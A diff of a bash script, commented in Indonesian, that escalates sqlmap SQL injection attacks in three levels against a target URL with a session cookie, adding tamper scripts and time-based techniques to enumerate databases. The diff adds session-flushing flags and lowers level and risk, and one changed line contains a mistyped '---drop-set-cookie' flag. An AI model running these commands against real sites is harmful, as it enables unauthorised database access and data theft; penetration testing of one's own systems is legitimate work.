@@ -82,7 +82,7 @@ fi
 echo -e "${CYAN}[Level 1] Running Basic SQL Injection (--batch)...${NC}"
 
 # Simpan command ke variabel (Menggunakan escape quote \" agar URL/Cookie aman)
-CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" --batch --dbs"
+CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" --drop-set-cookie --flush-session --fresh-queries --batch --dbs"
 
 # Tampilkan Command ke Layar
 echo -e "${YELLOW}    [COMMAND] $CMD${NC}"
@@ -100,7 +100,7 @@ sleep 10
 echo -e "${CYAN}[Level 2] Running $DESC_L2...${NC}"
 
 # Simpan Command (Memanggil variabel $TAMPER_L2)
-CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" --batch --tamper=$TAMPER_L2 --dbs"
+CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" ---drop-set-cookie --flush-session --fresh-queries --batch --tamper=$TAMPER_L2 --dbs"
 
 # Tampilkan Command
 echo -e "${YELLOW}    [COMMAND] $CMD${NC}"
@@ -118,7 +118,7 @@ sleep 10
 echo -e "${CYAN}[Level 3] Running $DESC_L3 (--level=5)...${NC}"
 
 # Simpan Command (Memanggil variabel $EXTRA_OPTS_L3)
-CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" --batch --technique=T --level=5 --risk=3 $EXTRA_OPTS_L3 --dbs"
+CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" --drop-set-cookie --flush-session --fresh-queries --batch --technique=T --level=3 --risk=2 $EXTRA_OPTS_L3 --dbs"
 
 # Tampilkan Command
 echo -e "${YELLOW}    [COMMAND] $CMD${NC}"
